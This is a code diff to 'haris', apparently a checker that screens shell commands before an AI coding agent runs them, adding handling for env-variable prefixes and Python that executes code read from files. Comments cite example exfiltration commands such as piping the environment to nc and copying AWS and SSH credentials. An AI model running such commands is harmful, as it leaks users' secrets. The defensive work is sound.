@@ -108,15 +108,27 @@ def pipeline(p: shell.Pipeline, ctx: Ctx) -> None:
         return
     prev: Stage | None = None
     secret = False
+    once = ctx.top and not p.background
+    trusted, spans = len(ctx.trusted_files), []
     for stage in p.stages:
         sub = ctx.child(marks=True)
+        sub.piped_top = once
+        start = len(ctx.findings)
         prev = node(stage, sub, prev) or Stage()
+        spans.append((start, len(ctx.findings)))
         # The whole environment holds every token the session has: it is as secret as one named. A
         # secret stays secret down the pipe: `env | gzip | nc host 1` still sends it (#350).
         secret = secret or prev.secret or prev.environ or "secret" in sub.marks
         prev.secret = secret
         prev.downloads = prev.downloads or "download" in sub.marks
         ctx.marks |= sub.marks
+    # code read from a file in one stage runs beside the other stages: none of them may change it (#343)
+    for paths, at in ctx.trusted_files[trusted:]:
+        others = [f for n, (a, b) in enumerate(spans) if not a <= at < b for f in ctx.findings[a:b]]
+        changing = next((f for f in others if may_change(f, paths)), None)
+        if changing:
+            ctx.add("dynamic", f"Another part of this pipeline may change {ctx.show(min(paths))} while the "
+                               "code read from it runs, so haris cannot tell what runs.")
 
 
 def node(n, ctx: Ctx, stdin: Stage | None) -> Stage | None:
@@ -281,9 +293,7 @@ def simple(cmd: shell.Simple, ctx: Ctx, stdin: Stage | None) -> Stage | None:
         expanded = expand(value, ctx)
         assigns.append((name, expanded[0] if expanded else arg("")))
     for name, value in assigns:
-        if name in RISKY_ENV or (name == "NODE_OPTIONS" and re.search(r"--(?:require|import|loader)|-r\b",
-                                                                      value)):
-            ctx.add("risky", f"Setting {name} changes which code the next program loads or runs.")
+        risky_assign(name, value, ctx)
     if not argv:
         for name, value in assigns:
             ctx.vars[name] = str(value)
@@ -339,8 +349,17 @@ def simple(cmd: shell.Simple, ctx: Ctx, stdin: Stage | None) -> Stage | None:
                         r.op in (">", ">|", "&>") and IGNORE_SCRIPTS_ON.search(rc_text(path))
                         and not IGNORE_SCRIPTS_ON.search(stage.text))):
                     ctx.add("risky", IGNORE_SCRIPTS_OFF_REASON.format(path=ctx.show(path)))
-                before = ctx.written.get(path, "") if r.op in (">>", "&>>") else ""
+                appends = r.op in (">>", "&>>")
+                before = ctx.written.get(path, "") if appends else ""
+                if appends and path not in ctx.written:
+                    ctx.appended.add(path)  # what the file held before is still in it
+                elif not appends:
+                    ctx.appended.discard(path)
                 ctx.written[path] = before + stage.text + "\n"
+                # how often, and whether once at the top of the call, for code that runs the file (#343)
+                ctx.write_counts[path] = ctx.write_counts.get(path, 0) + 1
+                if not ctx.top:
+                    ctx.write_loose.add(path)
             else:
                 ctx.written.pop(path, None)
     if secret_out:  # `env > f`, `cp ~/.aws/credentials f`, `tar czf f ~/.ssh`, `env | tee f`
@@ -351,6 +370,14 @@ def simple(cmd: shell.Simple, ctx: Ctx, stdin: Stage | None) -> Stage | None:
 
 
 WRITES = {"write", "write-temp", "write-outside", "write-memory", "secret-write"}
+
+
+def risky_assign(name: str, value: str, ctx: Ctx) -> None:
+    """A variable given to a command (`NAME=value cmd`, `env NAME=value cmd`) that changes which code the
+    command loads or runs."""
+    if name in RISKY_ENV or (name == "NODE_OPTIONS" and re.search(r"--(?:require|import|loader)|-r\b",
+                                                                  value)):
+        ctx.add("risky", f"Setting {name} changes which code the next program loads or runs.")
 
 
 def printed_into(cmd: shell.Simple, ctx: Ctx) -> str:
@@ -1213,8 +1240,9 @@ def h_trap(argv, ctx, stdin):
     return Stage()
 
 
-def shell_string(script: Arg, ctx: Ctx, args: list, via: str) -> Stage:
-    """Commands given as text (bash -c, eval, su -c, watch, ssh ...): parse and check them too."""
+def shell_string(script: Arg, ctx: Ctx, args: list, via: str, inherit: bool = True) -> Stage:
+    """Commands given as text (bash -c, eval, su -c, watch, ssh ...): parse and check them too. With
+    `inherit`, the variables given to the command (`NAME=value bash -c ...`) are set in there (#380)."""
     if UNKNOWN in script:
         if "download" in getattr(script, "marks", ()):
             ctx.add("download-run", f"`{via}` runs code it downloads, without you seeing it first.")
@@ -1224,6 +1252,8 @@ def shell_string(script: Arg, ctx: Ctx, args: list, via: str) -> Stage:
         return Stage()
     inner = ctx.child()
     inner.args = [str(a) for a in args]
+    if inherit:
+        inner.vars.update(ctx.prefix)
     try:
         walk(shell.parse(str(script), min(ctx.depth // 2, shell.MAX_DEPTH)), inner)
     except shell.ParseError as exc:
@@ -1330,25 +1360,51 @@ def h_wrapper(argv, ctx, stdin):
     return run(pos, ctx, stdin)
 
 
+ENV_WITH_ARG = {"-u", "--unset", "-C", "--chdir", "-S", "--split-string", "-P", "-a", "--argv0"}
+
+
 def h_env(argv, ctx, stdin):
-    opts, pos = options(argv[1:], {"-u", "--unset", "-C", "--chdir", "-S", "--split-string", "-P"},
-                        first_stops=True)
+    """`env [-i] [-u NAME] [NAME=value ...] cmd`: the variables are carried into the prefix that
+    `NAME=value cmd` fills, so every check that reads it sees them (#380)."""
+    opts, pos = options(argv[1:], ENV_WITH_ARG, first_stops=True)
+    clear = has(opts, "-i", "--ignore-environment")
+    if pos[:1] == ["-"]:  # `env -` is `env -i`
+        clear, pos = True, pos[1:]
+    prefix = {} if clear else dict(ctx.prefix)
+    for name in values(opts, "-u", "--unset"):
+        prefix.pop(str(name), None)
+    for value in values(opts, "-P"):  # BSD: where to look for the program, like PATH
+        prefix["PATH"] = str(value)
     for value in values(opts, "-C", "--chdir"):
         ctx = ctx.child()
         ctx.cwd = ctx.where.resolve(value, ctx.cwd)
     split = values(opts, "-S", "--split-string")
-    while pos and re.match(r"^[A-Za-z_]\w*=", pos[0]):
-        name = pos[0].split("=", 1)[0]
-        if name in RISKY_ENV:
-            ctx.add("risky", f"Setting {name} changes which code the next program loads or runs.")
-        pos = pos[1:]
     if split:
-        return shell_string(arg(split[0] + " " + " ".join(shquote(p) for p in pos), split[0].marks), ctx, [],
-                            "env -S")
+        # the string's words take the place of -S, and env goes on reading them as its own: options,
+        # NAME=value, then the command
+        text = " ".join(["env", *(str(s) for s in split), *(shquote(p) for p in pos)])
+        saved, ctx.prefix = ctx.prefix, prefix
+        try:
+            return shell_string(arg(text, joined_marks(split)), ctx, [], "env -S")
+        finally:
+            ctx.prefix = saved
+    # every word with `=` before the command is a variable, whatever its name (`env A-B=1 cmd`)
+    while pos and "=" in pos[0]:
+        name, _, value = str(pos[0]).partition("=")
+        if UNKNOWN in name:
+            ctx.add("dynamic", "Sets a variable whose name is only known when it runs, so haris cannot "
+                               "tell what it changes.")
+        risky_assign(name, value, ctx)
+        prefix[name] = value
+        pos = pos[1:]
     if not pos:
         environ_dump(ctx)
         return Stage(environ=True)
-    return run(pos, ctx, stdin)
+    saved, ctx.prefix = ctx.prefix, prefix
+    try:
+        return run(pos, ctx, stdin)
+    finally:
+        ctx.prefix = saved
 
 
 def environ_dump(ctx: Ctx) -> None:
@@ -2262,7 +2318,490 @@ def judge_runs(runs: list[tuple[str, str | None]], ctx: Ctx, via: str) -> bool:
     return all(LEVEL[TABLE.get(f.cls, (ASK,) * 3)[1]] <= LEVEL[PASS] for f in findings)
 
 
-def code_check(code: Arg, ctx: Ctx, via: str, lang: str = "") -> Stage:
+# ---------------------------------------------------------------- code read from a file (#343 step 2)
+# Inline Python that runs a file (exec(open(P).read()), exec(compile(open(P).read(), ...)), runpy.run_path(P))
+# is judged by the file's text, read once at decision time, when haris may read it: a regular file, not a
+# link and not under a linked folder, inside the project or the temporary folder, at most 64 KB. The text
+# judged is exactly what the code runs: the same string methods (split, replace, strip ...) with the same
+# literal arguments are applied to it. haris cannot stop a change between its check and the run; a file
+# that changed since an earlier check in the session counts as unknown the next time.
+
+CODE_FILE_MAX = 64 * 1024
+SCRIPT_READ_MAX = 16 * 1024  # `python FILE` only adds refusals: a lighter limit (see script_file_check)
+FILE_RUN_HINT = re.compile(r"\b(?:exec|run_path|run_module)\b")
+PY_STR_OPS = {"split", "rsplit", "partition", "rpartition", "replace", "strip", "lstrip", "rstrip"}
+# Names that can swap a builtin (open, exec) for something else, or reach one by name.
+PY_SHADOW = {"builtins", "__builtins__", "globals", "locals", "vars", "setattr", "delattr", "__dict__",
+             "modules", "importlib", "__import__", "__setattr__", "f_globals", "f_builtins", "f_locals"}
+PY_UTF8 = {"utf-8", "utf8", "utf_8", "u8"}
+PY_CODING = re.compile(rb"^[ \t\f]*#.*?coding[:=][ \t]*([-\w.]+)")
+SAFE_BESIDE = {"read", "read-outside", "read-unknown"}
+
+
+def read_code_file(path: str) -> tuple[bytes | None, tuple | None, str]:
+    """(bytes, (size, mtime_ns, ctime_ns, inode), "") for a file haris may read to judge the code in it;
+    (None, None, why not) otherwise. Never follows a link, never waits on a pipe, reads at most 64 KB."""
+    import stat
+    try:
+        first = os.lstat(path)
+    except FileNotFoundError:
+        return None, None, "it does not exist"
+    except OSError:
+        return None, None, "haris cannot read it"
+    if stat.S_ISLNK(first.st_mode):
+        return None, None, "it is a link"
+    if not stat.S_ISREG(first.st_mode):
+        return None, None, "it is not a regular file"
+    if first.st_nlink != 1:
+        return None, None, "it has other names (hard links)"
+    if first.st_size > CODE_FILE_MAX:
+        return None, None, "it is over 64 KB"
+    flags = os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_NONBLOCK", 0) | \
+        getattr(os, "O_NOCTTY", 0)
+    try:
+        fd = os.open(path, flags)
+    except OSError:
+        return None, None, "haris cannot read it"
+    try:
+        now = os.fstat(fd)
+        if (now.st_dev, now.st_ino) != (first.st_dev, first.st_ino) or not stat.S_ISREG(now.st_mode):
+            return None, None, "it changed while haris read it"
+        chunks, size = [], 0
+        while size <= CODE_FILE_MAX:
+            chunk = os.read(fd, CODE_FILE_MAX + 1 - size)
+            if not chunk:
+                break
+            chunks.append(chunk)
+            size += len(chunk)
+        after = os.fstat(fd)
+    except OSError:
+        return None, None, "haris cannot read it"
+    finally:
+        os.close(fd)
+    data = b"".join(chunks)
+    if len(data) > CODE_FILE_MAX or len(data) != after.st_size or after.st_mtime_ns != now.st_mtime_ns:
+        return None, None, "it changed while haris read it, or is over 64 KB"
+    return data, (after.st_size, after.st_mtime_ns, after.st_ctime_ns, after.st_ino), ""
+
+
+def code_file_place(value: str, ctx: Ctx) -> tuple[str, str, str]:
+    """(path as written, path with links followed, "") for a file in the project or the temporary folder
+    that no linked folder leads to; ("", "", why not) otherwise. Python opens it from where it runs."""
+    if not value or UNKNOWN in value or "\x00" in value or (not value.startswith("/") and ctx.cwd is None):
+        return "", "", "its name is only known when it runs"
+    if ".." in value.split("/"):
+        return "", "", "its path climbs back with .."
+    from .paths import norm, under
+    lexical = norm(value if value.startswith("/") else f"{ctx.cwd}/{value}")
+    real = norm(os.path.realpath(lexical))
+    where = ctx.where
+    if where.place(lexical) not in ("project", "temp") or where.place(real) not in ("project", "temp"):
+        return "", "", "it is outside the project and the temporary folder"
+    base = where.project_of(lexical) or max((t for t in where.temps if under(lexical, t)), key=len,
+                                            default="")
+    if not base or lexical == base:
+        return "", "", "it is outside the project and the temporary folder"
+    import stat
+    probe = base
+    for part in lexical[len(base):].strip("/").split("/")[:-1]:
+        probe += "/" + part
+        try:
+            if stat.S_ISLNK(os.lstat(probe).st_mode):
+                return "", "", "a folder on its path is a link"
+        except OSError:
+            return "", "", "it does not exist"
+    return lexical, real, ""
+
+
+def code_text(data: bytes, utf8: bool, by_path: bool) -> tuple[str | None, str]:
+    """The text Python runs from these bytes, or (None, why not). `by_path`: Python itself opens the file
+    (runpy, `python FILE`), which honours a coding line and runs a zip archive's __main__.py instead."""
+    if b"\x00" in data:
+        return None, "it holds a NUL byte"
+    if by_path:
+        if data[:2] == b"PK" or b"PK\x05\x06" in data:
+            return None, "it may be a zip archive, which Python runs differently"
+        for line in data.splitlines()[:2]:
+            m = PY_CODING.match(line)
+            name = m.group(1).decode("ascii", "replace").lower() if m else "utf-8"
+            if name not in PY_UTF8 | {"ascii", "us-ascii"} and not name.startswith(("utf-8-", "utf_8_")):
+                return None, "it names its own encoding"
+        utf8 = True
+        if data.startswith(b"\xef\xbb\xbf"):
+            data = data[3:]
+    try:
+        text = data.decode("utf-8")
+    except UnicodeDecodeError:
+        return None, "it is not UTF-8 text"
+    if not utf8 and not text.isascii():
+        return None, "it holds non-ASCII text, which Python decodes as the system's locale says"
+    return text.replace("\r\n", "\n").replace("\r", "\n"), ""
+
+
+def apply_ops(text: str, ops: list) -> str | None:
+    """The string the code builds from the file's text with literal string methods; None when it would
+    fail (that part does not exist) or grow past reason."""
+    value: object = text
+    try:
+        for op in ops:
+            if op[0] == "call":
+                if not isinstance(value, str) or op[1] not in PY_STR_OPS:
+                    return None
+                if op[1] == "replace":
+                    old, new = op[2][0], op[2][1]
+                    if len(value) + (value.count(old) + 1) * max(len(new) - len(old), 0) > 4 * CODE_FILE_MAX:
+                        return None
+                value = getattr(value, op[1])(*op[2])
+            elif op[0] == "index":
+                value = value[op[1]]  # type: ignore[index]
+            else:
+                value = value[slice(*op[1])]  # type: ignore[index]
+    except (ValueError, IndexError, TypeError):
+        return None
+    return value if isinstance(value, str) else None
+
+
+def python_file_runs(text: str) -> tuple[list[dict], list[str], str] | None:
+    """The files Python code runs as code: ([{path, utf8, ops, by_path, span, top}], problems, masked
+    text), where span is the call's place in the text, `top` that it and its read run once, at the top of
+    the code, after nothing that could change a file; problems are the runs haris cannot follow; the
+    masked text is the code with each followed call replaced by None. None when the code does not parse."""
+    import ast
+    try:
+        tree = ast.parse(text)
+    except Exception:  # SyntaxError, ValueError (a NUL), RecursionError ...
+        return None
+    parents = {id(child): n for n in ast.walk(tree) for child in ast.iter_child_nodes(n)}
+    bound: dict[str, list] = {}
+    runpy_names, run_path_names = set(), set()
+    problems: list[str] = []
+    for n in ast.walk(tree):
+        names: list[str] = []
+        if isinstance(n, ast.Name):
+            if not isinstance(n.ctx, ast.Load):
+                names = [n.id]
+            if n.id in PY_SHADOW:
+                problems.append(f"it uses {n.id}, which can change what open or exec are")
+        elif isinstance(n, ast.Attribute) and n.attr in PY_SHADOW:
+            problems.append(f"it uses {n.attr}, which can change what open or exec are")
+        elif isinstance(n, ast.arg):
+            names = [n.arg]
+        elif isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
+            names = [n.name]
+        elif isinstance(n, ast.ExceptHandler) and n.name:
+            names = [n.name]
+        elif isinstance(n, (ast.Global, ast.Nonlocal)):
+            names = list(n.names)
+        elif hasattr(ast, "MatchAs") and isinstance(n, (ast.MatchAs, ast.MatchStar)) and n.name:
+            names = [n.name]
+        elif hasattr(ast, "MatchMapping") and isinstance(n, ast.MatchMapping) and n.rest:
+            names = [n.rest]
+        elif isinstance(n, ast.Import):
+            for a in n.names:
+                names.append(a.asname or a.name.split(".")[0])
+                if a.name.split(".")[0] in PY_SHADOW:
+                    problems.append(f"it imports {a.name}, which can change what open or exec are")
+                if a.name == "runpy":
+                    runpy_names.add(a.asname or "runpy")
+        elif isinstance(n, ast.ImportFrom):
+            for a in n.names:
+                if (n.module or "").split(".")[0] in PY_SHADOW or a.name in PY_SHADOW:
+                    problems.append(f"it imports from {n.module}, which can change what open or exec are")
+                if a.name == "*":
+                    problems.append("it imports every name of a module, which may replace open or exec")
+                names.append(a.asname or a.name)
+                if n.module == "runpy" and a.name == "run_path" and not n.level:
+                    run_path_names.add(a.asname or a.name)
+        for name in names:
+            bound.setdefault(name, []).append(n)
+    for name in ("exec", "open", "compile"):
+        if name in bound:
+            problems.append(f"it gives the name {name} a meaning of its own")
+    if any(not isinstance(b, (ast.Import, ast.ImportFrom)) for x in runpy_names | run_path_names
+           for b in bound.get(x, [])):
+        problems.append("it gives runpy a meaning of its own")
+
+    def top_assign(node):
+        """The one statement at the top of the code that binds this name, when it is bound only there."""
+        if not isinstance(node, ast.Name) or len(bound.get(node.id, ())) != 1:
+            return None
+        only = bound[node.id][0]
+        stmt = parents.get(id(only))
+        if isinstance(stmt, ast.Assign) and len(stmt.targets) == 1 and stmt.targets[0] is only and \
+                parents.get(id(stmt)) is tree:
+            return stmt
+        return None
+
+    def const_str(node) -> str | None:
+        if isinstance(node, ast.Constant) and isinstance(node.value, str):
+            return node.value
+        stmt = top_assign(node)
+        return const_str(stmt.value) if stmt is not None and isinstance(stmt.value, ast.Constant) else None
+
+    def literal(node) -> bool:
+        return isinstance(node, ast.Constant) and isinstance(node.value, (str, int)) and \
+            not isinstance(node.value, bool)
+
+    def chain(node, sites: list) -> dict | None:
+        """{path, utf8, ops} for a string read from a file and cut with literal string methods; `sites`
+        gets the statements and calls where it is read."""
+        stmt = top_assign(node)
+        if stmt is not None:
+            sites.append(stmt)
+            return chain(stmt.value, sites)
+        if isinstance(node, ast.Subscript):
+            inner = chain(node.value, sites)
+            s = node.slice
+            if inner is None:
+                return None
+            if literal(s) and isinstance(s.value, int):
+                return {**inner, "ops": inner["ops"] + [("index", s.value)]}
+            if isinstance(s, ast.Slice) and all(p is None or (literal(p) and isinstance(p.value, int))
+                                                for p in (s.lower, s.upper, s.step)):
+                parts = tuple(None if p is None else p.value for p in (s.lower, s.upper, s.step))
+                return {**inner, "ops": inner["ops"] + [("slice", parts)]}
+            return None
+        if not isinstance(node, ast.Call) or not isinstance(node.func, ast.Attribute) or node.keywords:
+            return None
+        method = node.func.attr
+        if method in PY_STR_OPS and all(literal(a) for a in node.args):
+            inner = chain(node.func.value, sites)
+            return {**inner, "ops": inner["ops"] + [("call", method, tuple(a.value for a in node.args))]} \
+                if inner else None
+        opened = node.func.value
+        if method != "read" or len(node.args) > 1 or (node.args and not (
+                literal(node.args[0]) and isinstance(node.args[0].value, int))):
+            return None
+        if not (isinstance(opened, ast.Call) and isinstance(opened.func, ast.Name)
+                and opened.func.id == "open" and 1 <= len(opened.args) <= 2):
+            return None
+        path = const_str(opened.args[0])
+        if len(opened.args) == 2 and not literal(opened.args[1]):
+            return None
+        mode = opened.args[1].value if len(opened.args) == 2 else "r"
+        utf8 = False
+        for k in opened.keywords:
+            if k.arg == "encoding" and literal(k.value) and str(k.value.value).lower() in PY_UTF8:
+                utf8 = True
+            elif k.arg == "mode" and literal(k.value):
+                mode = k.value.value
+            else:
+                return None
+        if path is None or mode not in ("r", "rt", "tr"):
+            return None
+        ops = [("slice", (None, node.args[0].value, None))] if node.args else []
+        sites.append(node)
+        return {"path": path, "utf8": utf8, "ops": ops}
+
+    def allowed_before(stmt) -> bool:
+        """A statement that cannot change a file: an import of Python's own modules, a constant, a
+        docstring, sys.path set up, a string read from a file (what another followed run reads)."""
+        if isinstance(stmt, ast.Pass):
+            return True
+        if isinstance(stmt, ast.Import):
+            return not any(py_module_unknown(a.name) and a.name != "runpy" for a in stmt.names)
+        if isinstance(stmt, ast.ImportFrom):
+            module = stmt.module or ""
+            return bool(module) and not stmt.level and (module == "runpy" or not py_module_unknown(module)) \
+                and all(a.name != "*" for a in stmt.names)
+        if isinstance(stmt, ast.Expr) and isinstance(stmt.value, ast.Constant):
+            return True
+        if isinstance(stmt, ast.Assign) and all(isinstance(t, ast.Name) for t in stmt.targets):
+            if isinstance(stmt.value, ast.Constant) or chain(stmt.value, []) is not None:
+                return True
+        if isinstance(stmt, ast.Expr) and isinstance(stmt.value, ast.Call):
+            f = stmt.value.func
+            return (isinstance(f, ast.Attribute) and f.attr in ("insert", "append")
+                    and isinstance(f.value, ast.Attribute) and f.value.attr == "path"
+                    and isinstance(f.value.value, ast.Name) and f.value.value.id == "sys"
+                    and all(literal(a) for a in stmt.value.args) and not stmt.value.keywords)
+        return False
+
+    lines = re.split(r"(?<=\n)|(?<=\r)(?!\n)", text)
+    starts = [0]
+    for line in lines:
+        starts.append(starts[-1] + len(line))
+
+    def offset(lineno: int, col: int) -> int:
+        line = lines[lineno - 1] if lineno - 1 < len(lines) else ""
+        return starts[lineno - 1] + len(line.encode("utf-8")[:col].decode("utf-8", "ignore"))
+
+    def top_index(node) -> int | None:
+        """Where the statement holding this node sits at the top of the code, when it is one there."""
+        stmt = node if isinstance(node, ast.stmt) else parents.get(id(node))
+        if not isinstance(node, ast.stmt) and not (
+                isinstance(stmt, ast.Expr) or isinstance(stmt, ast.Assign) and stmt.value is node):
+            return None
+        return tree.body.index(stmt) if parents.get(id(stmt)) is tree else None
+
+    runs = []
+    for n in ast.walk(tree):
+        if not isinstance(n, ast.Call):
+            continue
+        f = n.func
+        if isinstance(f, ast.Name) and f.id == "exec":
+            kind = "exec"
+        elif isinstance(f, ast.Name) and f.id in run_path_names:
+            kind = "run_path"
+        elif isinstance(f, ast.Attribute) and f.attr in ("run_path", "run_module"):
+            kind = f.attr if isinstance(f.value, ast.Name) and f.value.id in runpy_names else "other"
+        else:
+            continue
+        sites: list = []
+        found = None
+        if kind == "exec" and len(n.args) == 1 and not n.keywords:
+            code = n.args[0]
+            if isinstance(code, ast.Call) and isinstance(code.func, ast.Name) and code.func.id == "compile" \
+                    and len(code.args) == 3 and not code.keywords and literal(code.args[1]) \
+                    and literal(code.args[2]) and code.args[2].value == "exec":
+                code = code.args[0]
+            found = chain(code, sites)
+            if found:
+                found["by_path"] = False
+        elif kind == "run_path" and len(n.args) == 1 and all(
+                k.arg == "run_name" and literal(k.value) for k in n.keywords):
+            path = const_str(n.args[0])
+            found = {"path": path, "utf8": True, "ops": [], "by_path": True} if path is not None else None
+        if found is None:
+            problems.append("it runs code from a file whose name or text haris cannot follow")
+            continue
+        index = top_index(n)
+        # where the file is read: the call itself, or the statement that reads it into a name
+        reads = [top_index(s) if isinstance(s, ast.stmt) else index for s in sites] or [index]
+        found["top"] = index is not None and all(
+            i is not None and all(allowed_before(b) for b in tree.body[:i]) for i in reads)
+        found["span"] = (offset(n.lineno, n.col_offset), offset(n.end_lineno, n.end_col_offset))
+        runs.append(found)
+    masked = text
+    for run_ in sorted(runs, key=lambda r: r["span"], reverse=True):
+        a, b = run_["span"]
+        masked = masked[:a] + "None" + masked[b:]
+    return runs, problems, masked
+
+
+def may_change(f: Finding, paths: set[str], written: set[str] = frozenset()) -> bool:
+    """A finding that may change one of these files: anything but a read or a write to a known place
+    elsewhere (a write to a file in `written` is one whose text haris already has)."""
+    from .paths import under
+    if f.cls in SAFE_BESIDE:
+        return False
+    if f.cls in WRITES | {"delete", "delete-outside"} and f.target and UNKNOWN not in f.target:
+        hits = [p for p in paths if p == f.target or under(p, f.target)]
+        return any(p != f.target or p not in written for p in hits)
+    return True
+
+
+def run_texts(run: dict, ctx: Ctx) -> tuple[list[str] | None, str, tuple[str, str] | None]:
+    """The texts the code may run from the file: as it is on disk, and as this command writes it before.
+    ([texts], why haris cannot trust them or "", (path, real path)). No texts when it cannot read them."""
+    path, real, why = code_file_place(run["path"], ctx)
+    if not path:
+        return None, why, None
+    if real not in ctx.code_files:
+        ctx.code_files[real] = read_code_file(path)
+    data, stat_, why = ctx.code_files[real]
+    texts = []
+    if data is not None:
+        text, why = code_text(data, run["utf8"], run["by_path"])
+        if text is None:
+            return None, why, (path, real)
+        texts.append(text)
+    elif real not in ctx.written or why != "it does not exist":
+        return None, why, (path, real)
+    trust = ""
+    if real in ctx.written:  # written earlier in this command: either text may run (the write may fail)
+        if ctx.write_counts.get(real, 0) != 1 or real in ctx.write_loose:
+            trust = "this command writes it more than once or not at its top level"
+        before = texts[0] if texts and real in ctx.appended else ""
+        texts.append(before + ctx.written[real])
+    elif stat_ is not None:
+        earlier = ctx.session_reads.get(real)
+        ctx.read_files[real] = list(stat_)
+        if earlier is not None and list(earlier) != list(stat_):
+            trust = ("it changed since haris read it earlier in this session (haris cannot stop a change "
+                     "between its check and the run)")
+    out = [apply_ops(t, run["ops"]) for t in texts]
+    if any(t is None for t in out):
+        return None, "the part of it the code runs does not exist", (path, real)
+    return out, trust, (path, real)  # type: ignore[return-value]
+
+
+def judge_file_runs(text: str, ctx: Ctx, via: str, lang: str) -> bool:
+    """Judge the files inline Python runs as code (#343): True when haris read every one and the code is
+    judged with their text in place of the calls; False when the code stays unknown (what haris could read
+    of the files is still judged, so harm in them is found)."""
+    found = python_file_runs(text)
+    if found is None:
+        return False
+    runs, problems, masked = found
+    if not runs and not problems:
+        return False
+    start = len(ctx.findings)
+    earlier = [f for f in ctx.findings if id(f) not in ctx.starts]
+    why = problems[0] if problems else ""
+    spans = [r["span"] for r in runs]
+    if not why and any(not any(a <= m.start() < b for a, b in spans) for m in exec_calls(text, [])):
+        why = "it also runs commands"
+    if not why and not (ctx.top or ctx.piped_top):
+        why = "it may run more than once, or beside other commands"
+    if not why and not ctx.as_written:
+        why = "another program runs it (xargs, find, nice ...), which may run it more than once"
+    texts: list[str] = []
+    shown, trusted_paths = [], set()
+    for run_ in runs:
+        got, trust, paths = run_texts(run_, ctx)
+        name = ctx.show(paths[0]) if paths else run_["path"]
+        if got is None:
+            why = why or f"haris could not read {name}: {trust}"
+            continue
+        texts += got
+        shown.append(name)
+        written = {paths[1]} if paths[1] in ctx.written else set()
+        if not why and trust:
+            why = f"{name}: {trust}"
+        if not why and not run_["top"]:
+            why = f"it runs {name} in a loop, a function or after code that may change files"
+        if not why and any(may_change(f, set(paths), written) for f in earlier):
+            why = f"an earlier command may change {name} before it runs"
+        trusted_paths |= set(paths)
+    if why:
+        if texts:  # what it could read is judged all the same: harm there is found
+            inner = ctx.child(findings=[])
+            code_check(arg("\n".join(texts)), inner, f"{via} (code read from a file)", lang, files=False)
+            ctx.findings += [f for f in inner.findings
+                             if LEVEL[TABLE.get(f.cls, (ASK,) * 3)[1]] >= LEVEL[ASK]]
+        ctx.add("dynamic", f"`{via}` runs code from a file that haris cannot judge: {why}.")
+        return False
+    ctx.trusted_files.append((trusted_paths, start))
+    ctx.add("exec", f"`{via}` runs the code in {', '.join(shown)}, which haris read and judged; haris cannot "
+                    "stop a change made between its check and the run.")
+    code_check(arg(masked + "\n" + "\n".join(texts)), ctx, via, lang, files=False)
+    if any(f.cls in WRITES | {"delete", "delete-outside"} and may_change(f, trusted_paths)
+           for f in ctx.findings[start:]):
+        ctx.add("dynamic", f"`{via}` changes the file it runs code from, so haris cannot tell what runs.")
+    return True
+
+
+def script_file_check(program: str, path: str, ctx: Ctx) -> None:
+    """`python FILE`: what haris may read of the file is judged as inline code, and what is refused in
+    every profile there (deleting your home folder, sending a secret ...) is refused here too (#343).
+    Anything else stays as before: Claude Code's own permission rules decide. Only a script up to 16 KB:
+    judging code costs about 1 ms per KB, and every script run pays it."""
+    lexical, real, why = code_file_place(path, ctx)
+    if not lexical:
+        return
+    if real not in ctx.code_files:
+        ctx.code_files[real] = read_code_file(lexical)
+    data = ctx.code_files[real][0]
+    text = code_text(data, True, True)[0] if data is not None and len(data) <= SCRIPT_READ_MAX else None
+    if text is None:
+        return
+    inner = ctx.child(findings=[])
+    code_check(arg(text), inner, f"{ctx.show(real)} (read by haris)", program, files=False)
+    ctx.findings += [f for f in inner.findings if f.cls in ALWAYS_NO]
+
+
+def code_check(code: Arg, ctx: Ctx, via: str, lang: str = "", files: bool = True) -> Stage:
     """Code given inline (python -c, node -e ...): find what it does, and never approve it."""
     if UNKNOWN in code:
         if "download" in getattr(code, "marks", ()):
@@ -2271,6 +2810,10 @@ def code_check(code: Arg, ctx: Ctx, via: str, lang: str = "") -> Stage:
             ctx.add("dynamic", f"`{via}` runs code that is only known when it runs.")
         return Stage()
     text = str(code)
+    # Python that runs a file as code is judged with the file's text, when haris may read it (#343)
+    if files and re.search(r"python|pypy", lang) and FILE_RUN_HINT.search(text) and \
+            judge_file_runs(text, ctx, via, lang):
+        return Stage()
     matches = list(STRING_LITERAL.finditer(text))
     literals = [next(g for g in m.groups() if g is not None) for m in matches]
     # In Python that never runs text as code, what sits in plain strings is data: a file's new contents.
@@ -2412,6 +2955,8 @@ def script_run(program: str, script: Arg, ctx: Ctx, how: str = "", rest: list | 
         ctx.add("exec", f"Runs {ctx.show(path)} {how or 'with ' + program}; haris does not read scripts, "
                         f"so Claude "
                         "Code's own permission rules apply.")
+        if path and re.match(r"python|pypy", program) and not how:
+            script_file_check(program, str(script), ctx)
     return Stage()
 
 
@@ -2421,6 +2966,7 @@ def written_run(program: str, path: str, ctx: Ctx, rest: list | None = None, lan
     lang = lang or program
     via = f"{ctx.show(path)} (written just before)"
     ctx.add("exec", f"Runs {ctx.show(path)}, which this command writes; haris read it before it runs.")
+    ctx.starts.add(id(ctx.findings[-1]))  # the script starting, not something run before it (#343)
     if re.search(r"python|pypy|node|deno|bun|ruby|perl|php", lang):
         return code_check(arg(text), ctx, via, lang)
     return shell_string(arg(text), ctx, [str(path), *(str(r) for r in rest or [])], via)
@@ -2703,7 +3249,7 @@ def remote(script: Arg, ctx: Ctx, where: str) -> None:
     """Commands that run on another machine or in a container: anything risky there is asked about."""
     inner = ctx.child(findings=[])
     inner.cwd = None
-    shell_string(script, inner, [], where)
+    shell_string(script, inner, [], where, inherit=False)
     for f in inner.findings:
         if LEVEL[TABLE.get(f.cls, (ASK,) * 3)[1]] >= LEVEL[ASK]:
             if f.cls in ("egress-secret", "remote-shell", "fork-bomb"):
